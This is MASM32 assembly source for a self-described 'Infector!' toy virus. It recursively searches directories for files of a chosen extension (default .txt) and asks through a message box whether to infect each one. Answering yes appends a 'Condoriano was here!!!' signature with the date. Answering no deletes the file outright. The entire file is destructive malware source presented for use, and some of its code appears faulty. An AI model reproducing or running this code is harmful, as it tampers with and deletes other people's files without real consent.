include \masm32\include\masm32rt.inc

.data
; SNIPPET CODE FOR GETTING FILEPATH FROM CURRENT PATH TO SUB DIRECTORIES
    file_tree       PROTO :DWORD,:DWORD,:DWORD
    cb_file_tree    PROTO :DWORD,:DWORD,:DWORD              ; user defined callback procedure
    get_pattern     PROTO :DWORD

; CREATING STRUCTURE FOR LOCAL TIME
    LPSYSTEMTIME STRUCT
        wYear           WORD ?
        wMonth          WORD ?
        wDayOfWeek      WORD ?
        wDay            WORD ?
        wHour           WORD ?
        wMinute         WORD ?
        wSecond         WORD ?
        wMilliseconds   WORD ?
    LPSYSTEMTIME ENDS

    localTime       LPSYSTEMTIME <>                         ; creating structure of LPSYSTEMTIME
    stringDec       db 16 dup(0)                            ; for string conversion

    f_lneBreak      db 13, 10, 0                            ; inserting new line
    f_fSep          db "\", 0

    vrsSgntr        db 256 dup(?)                           ; string storage for virus signature
    vrsSgntrNm      db "Condoriano was here!!! ", 0         ; first message of signature, your name goes here

    msgbx_title     db "Infector!", 0                       ; title of message box
    msgbx_cpt       db "Do you want to infect the file?", 0 ; caption for message box

    file_handle     HANDLE ?                                ; creating file handle for editing text
    filePathTI      db 256 dup(?)                           ; file path to infect
    nmbrOfBytesW    dd ?, 0                                 ; number of bytes to write for later
    
.code

start:
; SNIPPET CODE FOR GETTING CURRENT PATH AND SUB DIRECTORIES
    call mainProg
    exit

mainProg proc
    LOCAL   pbuf  :DWORD
    LOCAL   pcmd  :DWORD
    LOCAL   buffer1[128]:BYTE
    LOCAL   buffer2[128]:BYTE

    mov     pbuf, ptr$(buffer1)
    mov     pcmd, ptr$(buffer2)

    invoke  GetCL,1,pcmd
    .if eax != 1
      sas pbuf, "*.txt"                                     ; your file extension you want to infect
    .else
      mov pbuf, lcase$(pcmd)
    .endif

    fn      file_tree,OFFSET cb_file_tree,rv(get_pattern,pbuf),0
    ret
mainProg endp

; GETTING PATTERN
get_pattern proc src:DWORD
    push    esi
    mov     esi, src

  stlp:
    cmp     BYTE PTR [esi], "."                             ; check the position of period
    jne     @F                                              ; jump forward to the next anonymous label
    mov     edx, esi                                        ; store period position in EDX
    
  @@:
    cmp     BYTE PTR [esi], 0
    je      nxt
    add     esi, 1
    jmp     stlp

  nxt:
    test    edx, edx
    jz      quit
    add     edx, 1                                          ; step past period
    mov     esi, src
    mov     ecx, -1

  cpy:
    add     ecx, 1
    mov     al, [edx+ecx]                                   ; write bare pattern back to SRC
    mov     [esi+ecx], al
    test    al, al
    jnz     cpy

    mov     eax, src

  quit:
    pop     esi
    ret
get_pattern endp

; GETTING FILE TREE
file_tree proc lpcb:DWORD,upatn:DWORD,flag:DWORD
    LOCAL   hSrch :DWORD
    LOCAL   wfd   :WIN32_FIND_DATA
    LOCAL   pbuf  :DWORD
    LOCAL   buffer[260]:BYTE

    add     flag, 1
    mov     pbuf, ptr$(buffer)
    mov     hSrch, rv(FindFirstFile,"*.*",ADDR wfd)
    .if hSrch != INVALID_HANDLE_VALUE
      lea eax, wfd.cFileName
      switch$ eax
        case$ "."                                       ; bypass current directory character
          jmp @F
      endsw$
      .if wfd.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY
        chdir ADDR wfd.cFileName
        invoke file_tree,lpcb,upatn,flag                ; recurse to next directory level
      .endif

      push upatn
      lea eax, wfd
      push eax
      lea eax, wfd.cFileName
      push eax
      call lpcb

    @@:
      test rv(FindNextFile,hSrch,ADDR wfd), eax
      jz close_file
      lea eax, wfd.cFileName
      switch$ eax
        case$ ".."                                      ; bypass previous directory characters
          jmp @F
      endsw$
      .if wfd.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY
        chdir ADDR wfd.cFileName
        invoke file_tree,lpcb,upatn,flag                ; recurse to next directory level
      .endif

      push  upatn
      lea   eax, wfd
      push  eax
      lea   eax, wfd.cFileName
      push  eax
      call  lpcb

    @@:                                                 ; loop through the rest
      test  rv(FindNextFile,hSrch,ADDR wfd), eax
      jz    close_file

      push  upatn
      lea   eax, wfd
      push  eax
      lea   eax, wfd.cFileName
      push  eax
      call  lpcb

      .if wfd.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY
        chdir ADDR wfd.cFileName
        invoke file_tree,lpcb,upatn,flag    ; recurse to next directory level
      .endif
      jmp @B

    close_file:
      invoke FindClose,hSrch
    .endif

    .if flag > 0                                        ; flag controlled tail recursion
      chdir ".."                                        ; drop back to next lower directory
    .endif
    ret
file_tree endp

cb_file_tree proc pfilename:DWORD,pwfd:DWORD,upatn:DWORD
    LOCAL   pbuf  :DWORD
    LOCAL   pdir  :DWORD
    LOCAL   buffer1[260]:BYTE
    LOCAL   buffer2[260]:BYTE

  ; ----------------------
  ; don't list a directory
  ; ----------------------
    cmp     rv(GetFileAttributes,pfilename), FILE_ATTRIBUTE_DIRECTORY
    jne     @F
    ret
  @@:

    mov     pbuf,  ptr$(buffer1)
    mov     pdir,  ptr$(buffer2)

    cst     pbuf, pfilename                             ; copy file name to buffer
    mov     pbuf, rv(get_pattern,lcase$(pbuf))          ; get filename pattern

  ; --------------------------
  ; user file extension is *.*
  ; --------------------------
    fn      szCmp,upatn,"*"
    test    eax, eax
    jz      @F
    invoke  GetCurrentDirectory,260,pdir
    print   pdir,"\"
    print   pfilename,13,10                             ; display the file name
    ret
  @@:

  ; --------------------------------
  ; user file extension is specified
  ; --------------------------------
    fn      szCmp,upatn,pbuf
    test    eax, eax
    jz      @F
    invoke  GetCurrentDirectory,260,pdir
    ;print   pdir,"\"                                   ; commented to display filename only
    print   pfilename,13,10                             ; display the lower case name

; MY INSERTED CODE
    mov     filePathTI, 0                               ; set the file path holder to null

    push    pdir                                        ; get the current directory
    push    offset filePathTI                           ; destination
    call    szCatStr                                    ; concatenate

    push    offset f_fSep                               ; insert file separator
    push    offset filePathTI                           ; destination
    call    szCatStr                                    ; concatenate

    push    pfilename                                   ; get the file name
    push    offset filePathTI                           ; destination
    call    szCatStr                                    ; concatenate

    ;push    offset filePathTI                          ; for testing purposes
    ;call    StdOut                                      

    call    msgBoxIns                                   ; call message box
  @@:
    ret
cb_file_tree endp

; VIRUS SIGNATURE
virSig proc
    mov     vrsSgntr, 0                                 ; set virus signature to null

    push    offset f_lneBreak                           ; insert line break
    push    offset vrsSgntr                             
    call    szCatStr                                    

    push    offset vrsSgntrNm                           ; insert name of the creator
    push    offset vrsSgntr                             
    call    szCatStr                                    

    push    offset localTime                            ; call get localtime
    call    GetLocalTime                                

    movzx   eax, localTime.wMonth                       ; get the month
    lea     edi, stringDec                              ; load effective addres of stringdec to edi
    call    to_string                                   ; convert to string

    push    offset stringDec                            ; concatenate converted string
    push    offset vrsSgntr                             
    call    szCatStr                                    

    push    offset f_fSep                               ; add file separator
    push    offset vrsSgntr                             
    call    szCatStr                                    

    movzx   eax, localTime.wDay                         ; get the month
    lea     edi, stringDec                              
    call    to_string                                   

    push    offset stringDec                            
    push    offset vrsSgntr                             
    call    szCatStr                                    

    push    offset f_fSep                               ; add file separator
    push    offset vrsSgntr                             
    call    szCatStr                                    

    movzx   eax, localTime.wYear                        ; get the year
    lea     edi, stringDec                              
    call    to_string                                   

    push    offset stringDec                            
    push    offset vrsSgntr                             
    call    szCatStr                                    

    to_string proc                                      ; repeatedly divide by 10 and store its digits
        mov     ebx, 10                                 ; ebx is divisor
        xor     ecx, ecx                                ; counter is ecx, setting to zero by xor

    repeated_division:
        xor     edx, edx                                ; remainder/ cleaning the edx by setting it to zero
        div     ebx                                     ; ebx is the divisor
        push    dx                             
        add     cl, 1                                   ; add 1 to counter
        or      eax, eax                                ; check eax if 0
        jnz     repeated_division                       ; if eax not zero

    load_digits:
        pop     ax
        or      al, 00110000b                           ; transform to ascii
        stosb                                           ; stores al to edi
        loop    load_digits
        mov     byte ptr [edi], 0
        ret
    to_string endp
    ret
virSig endp

; CREATING MESSAGE BOX
msgBoxIns proc
    push    MB_YESNO                                    ; Yes/ No Message Box type
    push    offset msgbx_title                          ; title of message box
    push    offset msgbx_cpt                            ; caption of message box
    push    0
    call    MessageBoxA

    cmp eax, 6                                          ; default value for yes
    je      clkYesInfct      
    cmp eax, 7                                          ; default value for no
    je      clkNoDel      
    ret
msgBoxIns endp

clkYesInfct proc
    create_file:
        push    0                                       ; template file
        push    FILE_ATTRIBUTE_NORMAL                   ; flags and attributes
        push    OPEN_EXISTING                           ; creation type
        push    0                                       ; security attribute
        push    0                                       ; share mode
        push    FILE_SHARE_WRITE                        ; access type
        push    offset filePathTI                       ; file name or path to infect
        call    CreateFileA            
        mov     file_handle, eax        
        
    set_file_pointer:
        push    FILE_END                                ; move method
        push    0                                       ; distance to move high
        push    0                                       ; distance to move low
        push    file_handle                             ; file handle
        call    SetFilePointer

        write_txt_file:
        call    virSig                                  ; call the signature
    
        push    offset vrsSgntr                         ; get the length for lp number of bytes written
        call    StrLen
        mov     nmbrOfBytesW, eax                           

        mov     eax, 0                                  ; resets the value of eax
        push    offset vrsSgntr                         ; get the length
        call    lstrlen

        push    0                                       ; overlapped
        push    0                                       ; Windows 7 - this parameter can be null only when the lpoverlapped parameter is not null, insert nmbrOfBytesW here
        push    eax
        push    offset vrsSgntr                         ; file path
        push    file_handle
        call    WriteFile                               ; call write file

    close_file_handle:                                  ; close handle
        push    file_handle
        call    CloseHandle
        ret
clkYesInfct endp

clkNoDel proc                                           ; delete file
        push    offset filePathTI                       ; file path
        call    DeleteFileA                             ; call the delete file
        ret
clkNoDel endp      

end start

